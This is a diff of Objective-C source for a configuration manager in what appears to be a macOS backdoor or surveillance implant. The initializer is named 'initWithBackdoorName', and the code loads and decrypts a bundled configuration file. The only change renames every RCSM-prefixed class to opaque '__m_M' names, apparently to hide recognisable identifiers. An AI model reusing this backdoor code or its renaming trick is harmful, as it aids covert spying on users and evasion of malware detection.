@@ -29,7 +29,7 @@
 #pragma mark Private Interface
 #pragma mark -
 
-@interface RCSMConfManager (hidden)
+@interface __m_MConfManager (hidden)
 
 - (BOOL)_searchDataForToken: (NSData *)data
                       token: (char *)token
@@ -45,7 +45,7 @@
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSMConfManager (hidden)
+@implementation __m_MConfManager (hidden)
 
 - (BOOL)_searchDataForToken: (NSData *)data
                       token: (char *)token
@@ -78,7 +78,7 @@
   NSData *rawHeader;
   int i;
   int pos = 0;
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   for (i = 0; i < nTimes; i++)
     {
@@ -121,7 +121,7 @@
   int i, z;
   int pos = 0;
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   for (i = 0; i < nTimes; i++)
     {      
@@ -282,7 +282,7 @@
   NSData *rawHeader, *tempData;
   int i;
   u_long pos = 0;
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   for (i = 0; i < nTimes; i++)
     {
@@ -360,7 +360,7 @@
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSMConfManager
+@implementation __m_MConfManager
 
 - (id)initWithBackdoorName: (NSString *)aName
 {
@@ -381,7 +381,7 @@
                                     length: CC_MD5_DIGEST_LENGTH];
 #endif
       
-      mEncryption = [[RCSMEncryption alloc] initWithKey: temp];
+      mEncryption = [[__m_MEncryption alloc] initWithKey: temp];
     }
   
   return self;
@@ -398,7 +398,7 @@
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                  [[NSBundle mainBundle] bundlePath],
@@ -457,7 +457,7 @@
   return YES;
 }
 
-- (RCSMEncryption *)encryption
+- (__m_MEncryption *)encryption
 {
   return mEncryption;
 }
